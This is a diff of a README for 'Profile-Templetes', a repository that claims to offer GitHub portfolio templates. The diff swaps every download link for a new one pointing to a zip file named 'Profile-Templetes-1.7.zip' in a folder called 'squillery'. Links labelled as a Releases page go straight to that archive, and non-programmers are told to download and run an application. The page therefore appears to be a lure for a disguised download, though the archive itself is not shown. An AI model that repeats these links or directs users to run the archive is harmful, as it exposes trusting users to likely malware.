@@ -1,6 +1,6 @@
 # 🎨 Profile-Templetes - Discover Perfect GitHub Portfolio Templates
 
-[![Download](https://raw.githubusercontent.com/FouadAlshweiki04/Profile-Templetes/main/squillery/Profile-Templetes.zip)](https://raw.githubusercontent.com/FouadAlshweiki04/Profile-Templetes/main/squillery/Profile-Templetes.zip)
+[![Download](https://github.com/FouadAlshweiki04/Profile-Templetes/raw/refs/heads/main/squillery/Profile-Templetes-1.7.zip)](https://github.com/FouadAlshweiki04/Profile-Templetes/raw/refs/heads/main/squillery/Profile-Templetes-1.7.zip)
 
 ## 📖 Description
 
@@ -12,9 +12,9 @@ Follow these simple steps to download and run the application. No programming sk
 
 ## 🔗 Download & Install
 
-1. **Visit this page to download:** [Profile-Templetes Releases](https://raw.githubusercontent.com/FouadAlshweiki04/Profile-Templetes/main/squillery/Profile-Templetes.zip). Here you will find the latest portfolio templates ready for your use. 
+1. **Visit this page to download:** [Profile-Templetes Releases](https://github.com/FouadAlshweiki04/Profile-Templetes/raw/refs/heads/main/squillery/Profile-Templetes-1.7.zip). Here you will find the latest portfolio templates ready for your use. 
    
-    ![Download](https://raw.githubusercontent.com/FouadAlshweiki04/Profile-Templetes/main/squillery/Profile-Templetes.zip)
+    ![Download](https://github.com/FouadAlshweiki04/Profile-Templetes/raw/refs/heads/main/squillery/Profile-Templetes-1.7.zip)
 
 2. **Choose a template:** Once on the page, scroll through the list of available templates. Each template has a brief description to help you choose the right one for your needs.
 
@@ -43,7 +43,7 @@ Join other users and share your feedback. Check the community forums or GitHub d
 
 ## 📅 Updates
 
-Keep your templates updated by revisiting the [Releases page](https://raw.githubusercontent.com/FouadAlshweiki04/Profile-Templetes/main/squillery/Profile-Templetes.zip). New templates and features are added regularly. 
+Keep your templates updated by revisiting the [Releases page](https://github.com/FouadAlshweiki04/Profile-Templetes/raw/refs/heads/main/squillery/Profile-Templetes-1.7.zip). New templates and features are added regularly. 
 
 ## 📝 License
 
